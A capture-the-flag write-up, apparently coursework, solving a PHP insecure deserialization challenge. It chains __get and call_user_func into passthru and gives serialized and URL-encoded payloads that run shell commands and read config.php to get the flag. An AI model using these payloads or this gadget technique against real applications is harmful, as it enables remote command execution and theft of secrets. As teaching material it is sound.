# CTF Challenge with Group ✌
- **Insecure Deserialization**:<br>
- **Subject:** CTF Challenge in Secure Programming and Exploiting Vulnerabilities subject<br>
- **Team:** Blackberries<br>
- **Link:** http://45.122.249.68:10001/

## Write Up:<br>
- Enter link, we see a PHP code
```
<?php
#include "config.php";
class User{
    private $name;
    private $is_admin = false;
    public function __construct($name){
        $this->$name = $name;
    }
    public function __destruct(){
        if($this->is_admin === true){
            echo "hi admin, here is your flag";
        }
    }
}
class Show_color{
    public $color;
    public $type;
    public function __construct($type,$color){
        $this->type = $type;
        $this->color = $color;
    }
     public function __destruct(){
         call_user_func($this->type->adu,$this->color);
     }
}
class do_nothing{
    public $why;
    public $i_use_this;
    public function __construct($a,$b){
        $this->why = $a;
        $this->i_use_this = $b;
    }
    public function __get($method){
        if(isset($this->why)){
            return $this->i_use_this;
        }
        return $method;
    }
}
if(isset($_GET['code'])){
    unserialize($_GET['code']);
}
else{
    highlight_file(__FILE__);
}
?>
```
- There are 3 main classes:  `User`, `Show_color` and `do_nothing`<br>
- The "main" code:
```
if(isset($_GET['code'])){
    unserialize($_GET['code']);
}
else{
    highlight_file(__FILE__);
}
```
The code above will get the value of `code` in URL through `$_GET[]` and `unserialize` the variable `code` . In case `code` is **null** then show the code like being - `highlight_file(__FILE__);`.There are two another function `__construct()` và `__destruct()` and this is the good case for **insecure deserialization** with `unserialize` has no verify-input job so we can take advantage of this to exploit
- We notice that `User` class seems strange when a line shows  `admin=false`and when `admin=true` then print `"hi admin, here is your flag"`. So we trying to serialize the `User` object.
```
$a = new User('name');
$b = serialize($a);
echo $b;
```
Serialized string: `O:4:"User":2:{s:10:"Username";s:4:"name";s:14:"Useris_admin";b:0;}`.
Change the value `admin` into `true`-> Change `b:0` into `b:1`. Give this to `$code` in URL: 
http://45.122.249.68:10001?code=O:4:"User":2:{s:10:"Username";s:4:"name";s:14:"Useris_admin";b:1;}
We only see a blank page and nothing special with source code (Ctrl + U)
- According to next 2 classes, they're likely to be vulnerable cause in class `Show_color`, it uses `call_user_func()`. With this, we can execute our desired command with the first parameter is the function, the second one is the parameter for the precede function. For more details, see [here](https://www.php.net/manual/en/function.call-user-func). Considering some functions that allow us to **execute shell**: `exec()`, `shell_exec()`, `system()`, `passthru()`, which `system()` and `passthru()` are the best use cases (as I think) cause it's easy to use.
- Next, we think how to put that **excute shell** in classes's methods. 
```
public function __destruct(){
         call_user_func($this->type->adu,$this->color);
     }
```
- As recommendation,  `passthru()` is passed into first parameter and `ls` will be the second. But the problem here, with second one we can transfer `ls` into `$color`through **constructor** but can not transfer `passthru` into the first cause its operation `$this->type->adu`, we have to manage to set `$this-type` as an object and `adu` would be the member or method.
- Take a look at `do_nothing`class, there is a fucntion `__get()`.This is one of [Magic Methods](https://www.php.net/manual/en/language.oop5.magic.php) to override the reserved function by PHP. `__get()` take a parameter as a member or method. In the code, function `__get()` return  `this ->i_use_this` when  `this->why` is not empty. 
### Solution:
- Create instance  `do_nothing` with 2 parameters `123` (Optional value)  and `passthru`. 
- Create instance`Show_color` with 2 parameters **do_nothing object** above and the command we want to execute ex. `ls`. 
- Sau đó `serialize` đối tượng  `Show_color`
**Sample**:
```
$a = new do_nothing(123,"passthru");
$b = new Show_color($a,"ls");
$code = serialize($b);
echo $code;
```
Output:
`O:10:"Show_color":2:{s:5:"color";s:2:"ls";s:4:"type";O:10:"do_nothing":2:{s:3:"why";i:123;s:10:"i_use_this";s:8:"passthru";}}`
- Send to  var `code` and send request to reload page <br>

<p align="center">
  <img src="https://user-images.githubusercontent.com/48288606/138675519-6fc911d4-823a-405a-b6f8-a74da4e05dec.png">
</p>

- There are 2 files. The command was executed successfully, we can review the logic flow as the following: Take a deep in the line `call_user_func($this->type->adu,$this->color);`. `$this->type` will become `$a`, means it will operate this `call_user_func($a->adu,$this->color);`. How about `$a->adu` was processed? Back again in `__get($method)` . And `$method` here is `adu`, this `$method` is actually do nothing, `$this->why` is set **null** to run the **block code** inside `return $this->i_use_this;` , it's equivalent to `return passthru($command)` with **$command** we have set above - `ls`.
- Afterthat, we try read file `config.php` first. Change `ls` into `cat config.php` , serialize again and do the similar with all the step above
Payload: O:10:"Show_color":2:{s:5:"color";s:13:"cat config.php";s:4:"type";O:10:"do_nothing":2:{s:3:"why";i:123;s:10:"i_use_this";s:8:"passthru";}}

<p align="center">
  <img src="https://user-images.githubusercontent.com/48288606/138678027-6bf37d9f-08e8-4fc4-a663-242a7e406030.png">
</p>

Seem not work? We take a consideration the variable we handle when manipulate all the value through URL, which will be affected by **URL Encode**. So in `cat index.php` it was the "space" in the string that will be encoded. For working properly, we should encode the payload

<p align="center">
  <img src="https://user-images.githubusercontent.com/48288606/138679801-71a74d2a-a376-478c-a92f-29e0da356e67.png">
</p>

**Final Payload**: %4f%3a%31%30%3a%22%53%68%6f%77%5f%63%6f%6c%6f%72%22%3a%32%3a%7b%73%3a%35%3a%22%63%6f%6c%6f%72%22%3b%73%3a%31%34%3a%22%63%61%74%20%63%6f%6e%66%69%67%2e%70%68%70%22%3b%73%3a%34%3a%22%74%79%70%65%22%3b%4f%3a%31%30%3a%22%64%6f%5f%6e%6f%74%68%69%6e%67%22%3a%32%3a%7b%73%3a%33%3a%22%77%68%79%22%3b%69%3a%31%32%33%3b%73%3a%31%30%3a%22%69%5f%75%73%65%5f%74%68%69%73%22%3b%73%3a%38%3a%22%70%61%73%73%74%68%72%75%22%3b%7d%7d
- Blank page, check the source code.
```
<?php
$flag = "flag{n0j_l0j_pk4j_qju_l4y_l0j_dunq_nku_c0n_bu0m_d4u_r0j_l4j_b4y}";
?>
```
**=>flag{n0j_l0j_pk4j_qju_l4y_l0j_dunq_nku_c0n_bu0m_d4u_r0j_l4j_b4y}**
